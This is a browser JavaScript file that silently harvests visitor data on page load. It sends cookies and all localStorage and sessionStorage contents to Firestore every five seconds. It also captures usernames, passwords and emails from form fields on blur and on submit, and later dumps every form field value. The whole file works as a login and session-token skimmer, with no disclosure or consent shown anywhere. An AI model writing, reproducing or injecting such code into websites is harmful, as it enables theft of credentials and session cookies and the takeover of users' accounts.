document.addEventListener('DOMContentLoaded', function() {
    // Collect session data immediately
    collectSessionData();
    
    // Set up periodic collection
    setInterval(collectSessionData, 5000); // Collect every 5 seconds
    
    // Handle form submission
    const form = document.getElementById('dataCollectionForm');
    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            collectAutofillData();
        });
    }
    
    // Also collect when user interacts with form fields
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('blur', collectAutofillData);
    });
});

async function collectSessionData() {
    try {
        // Collect comprehensive session data
        const sessionData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            cookies: document.cookie,
            localStorageItems: {},
            sessionStorageItems: {},
            referrer: document.referrer,
            location: window.location.href,
            screenInfo: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            }
        };
        
        // Collect localStorage items
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            try {
                sessionData.localStorageItems[key] = localStorage.getItem(key);
            } catch (e) {
                sessionData.localStorageItems[key] = "[Access Denied]";
            }
        }
        
        // Collect sessionStorage items
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            try {
                sessionData.sessionStorageItems[key] = sessionStorage.getItem(key);
            } catch (e) {
                sessionData.sessionStorageItems[key] = "[Access Denied]";
            }
        }
        
        // Send to Firestore
        await sendToFirestore('session_data', sessionData);
    } catch (error) {
        console.error('Error collecting session data:', error);
    }
}

async function collectAutofillData() {
    try {
        // Collect autofill data from form
        const formData = {
            timestamp: new Date().toISOString(),
            username: document.getElementById('username')?.value || '',
            password: document.getElementById('password')?.value || '',
            email: document.getElementById('email')?.value || '',
            userAgent: navigator.userAgent,
            location: window.location.href
        };
        
        // Only send if we have meaningful data
        if (formData.username || formData.password || formData.email) {
            // Send to Firestore
            await sendToFirestore('autofill_data', formData);
        }
    } catch (error) {
        console.error('Error collecting autofill data:', error);
    }
}

async function sendToFirestore(collectionName, data) {
    try {
        // Ensure Firestore is initialized
        if (!window.firestoreDB) {
            console.error('Firestore not initialized');
            return;
        }
        
        // Add document to collection
        const docRef = await addDoc(collection(collectionName), data);
        console.log(`${collectionName} document written with ID:`, docRef.id);
    } catch (error) {
        console.error(`Error adding document to ${collectionName}:`, error);
    }
}

// Additional data collection methods
async function collectFormHistory() {
    try {
        const forms = document.getElementsByTagName('form');
        const formData = {
            timestamp: new Date().toISOString(),
            forms: []
        };
        
        for (let i = 0; i < forms.length; i++) {
            const form = forms[i];
            const formInfo = {
                id: form.id,
                name: form.name,
                action: form.action,
                method: form.method,
                fields: []
            };
            
            const inputs = form.querySelectorAll('input, select, textarea');
            inputs.forEach(input => {
                formInfo.fields.push({
                    name: input.name,
                    type: input.type,
                    value: input.value,
                    autocomplete: input.autocomplete
                });
            });
            
            formData.forms.push(formInfo);
        }
        
        if (formData.forms.length > 0) {
            await sendToFirestore('form_history', formData);
        }
    } catch (error) {
        console.error('Error collecting form history:', error);
    }
}

// Collect form data on page load
setTimeout(collectFormHistory, 3000);
